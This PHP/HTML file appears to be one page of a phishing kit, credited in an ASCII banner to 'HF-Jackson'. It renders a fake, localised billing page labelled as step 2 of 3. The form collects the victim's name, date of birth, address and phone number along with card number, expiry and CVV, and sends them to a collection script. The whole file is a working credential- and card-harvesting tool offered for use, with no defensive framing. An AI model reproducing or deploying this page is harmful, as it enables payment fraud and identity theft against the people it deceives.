<?php
/* 
  _   _   _____         _                  _                          
 | | | | |  ___|       | |   __ _    ___  | | __  ___    ___    _ __  
 | |_| | | |_       _  | |  / _` |  / __| | |/ / / __|  / _ \  | '_ \ 
 |  _  | |  _|     | |_| | | (_| | | (__  |   <  \__ \ | (_) | | | | |
 |_| |_| |_|        \___/   \__,_|  \___| |_|\_\ |___/  \___/  |_| |_|

  __  __                         _                    _            __          __  _____   ______
 |  \/  |                       | |                  | |           \ \        / / |_   _| |___  /
 | \  / |   ___    _   _   ___  | |_    __ _    ___  | |__     ___  \ \  /\  / /    | |      / / 
 | |\/| |  / _ \  | | | | / __| | __|  / _` |  / __| | '_ \   / _ \  \ \/  \/ /     | |     / /  
 | |  | | | (_) | | |_| | \__ \ | |_  | (_| | | (__  | | | | |  __/   \  /\  /     _| |_   / /__ 
 |_|  |_|  \___/   \__,_| |___/  \__|  \__,_|  \___| |_| |_|  \___|    \/  \/     |_____| /_____|
                                                                                                                      
                                                                            

*/
/*==============[Lange_CounTry]=================*/
session_start();
include('../boot.php');	
include('../inc/lang.php');	
include "../inc/lang".$_SESSION['HF-JAckson'];
$HF_V = $_SESSION['country_name'];
/*===============[Code_HTML]====================*/

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<title><?php echo $Fartout;?> <?php echo $HF_V;?>-<?php echo $bling;?></title>
	<link rel="shortcut icon" href="../Files/img/icon.ico"/>
	<link rel="stylesheet" type="text/css" href="../Files/css/bil.css">
	<style type="text/css" media="screen">
    .has-error input {
      border-width: 1px;
    }

    .validation.text-danger:after {
      content: 'Validation failed';
    }

    .validation.text-success:after {
      content: 'Validation passed';
    }
    .has-error .checkbox, .has-error .checkbox-inline, .has-error .control-label, .has-error .help-block, .has-error .radio, .has-error .radio-inline, .has-error.checkbox label, .has-error.checkbox-inline label, .has-error.radio label, .has-error.radio-inline label 
    {
          color: #a94442;
    }

    .has-error .form-control
    {
          box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
          border:2px solid #a94442;
    }
   .HF_Card {
    display: inline-block;
    background-image: url("http://i.imgur.com/NJHG6g5.png");
    background-repeat: no-repeat;
    background-position: 0px -406px;
    height: 27px;
    position: absolute;
    top: 370px;
    left: 1049px;
    width: 40px;
}
  </style>
</head>
<body>


   <div class="wrapp">

   	<header>
   		<div class="logo">
   			<img src="../Files/img/o.svg.png">
   		</div>
   		<div class="tbat">
   			<a href="#"><?php echo $khoroj;?></a>
   		</div>
   	</header>

   	<div class="bil">
   	  <div class="set">
   	  	<div class="lawal">
   	  		<span>
   	  			<?php echo $saybok;?> <b>2</b> <?php echo $saybok1;?> <b>3</b> 
   	  	    </span>
   	  	    <h1><?php echo $upld;?></h1>
   	  	</div>
   	  	<div class="bil_form">
   	  		<form action="../Edit/BLNG.php" method="post">
   	  			<input type="text" name="f_name" placeholder="<?php echo $smiya;?>" required>
   	  			<input type="text" name="date" placeholder="<?php echo $tarikh;?>" id="date" required>
				 <div class="state">
                </div>
                <input type="text" name="addres" placeholder="<?php echo $adrs1;?>" required>
                <input type="text" name="city" placeholder="<?php echo $mdina;?>" required>
                <input type="text" name="zip" placeholder="<?php echo $zip;?>" required>
                <input type="text" name="phone" placeholder="<?php echo $namra;?>" required>
				<div class="lawal">
					<div class="ccv">
						<h1><?php echo $sn;?></h1>
					</div>
                	<div class="img">
                		<img src="../Files/img/vis.png">
                		<img src="../Files/img/mass.png">
                		<img src="../Files/img/amex.png">
                	</div>
                	<div class="n_ccv">
                		<input name="number_cart" id="cc-number" type="tel" class="input-lg form-control cc-number cc-num" autocomplete="cc-number" placeholder="<?php echo $CCnum;?>" onkeypress="return isNumberKey(event)" onkeyup="ZEBI(this.value)" onkeyup="type_carte()" id="nubmer-cart" required>
                		<input name="date_cart" id="cc-exp" type="tel" class="input-lg form-control cc-exp" autocomplete="cc-exp" placeholder="<?php echo $dateCC;?>" required>
                		<input name="ccv_cart" id="cc-cvc" type="tel" class="input-lg form-control cc-cvc" autocomplete="off" placeholder="<?php echo $cvv;?>" required>
                	</div>
                </div>
                <input type="submit" name="sbt" value="<?php echo $bton;?>" id="send_cc">
   	  		</form>
   	  	</div>
   	  </div>	
   	</div>

   </div>

   <footer>
          <div class="wrapp">
               <div class="lawal">
                    <a href="#"><?php echo $so2al;?> <?php echo $cnt;?></a>
               </div>
               <div class="tani">
                    <ul>
                         <li>
                              <a href="">
                                   <span><?php echo $src;?></span>
                              </a>
                         </li>
                         <li>
                              <a href="">
                                   <span><?php echo $tem;?></span>
                              </a>
                         </li>
                         <li>
                              <a href="">
                                   <span><?php echo $prv;?></span>
                              </a>
                         </li>
                    </ul>
               </div>
          </div>     
          </footer>


</body>
</html>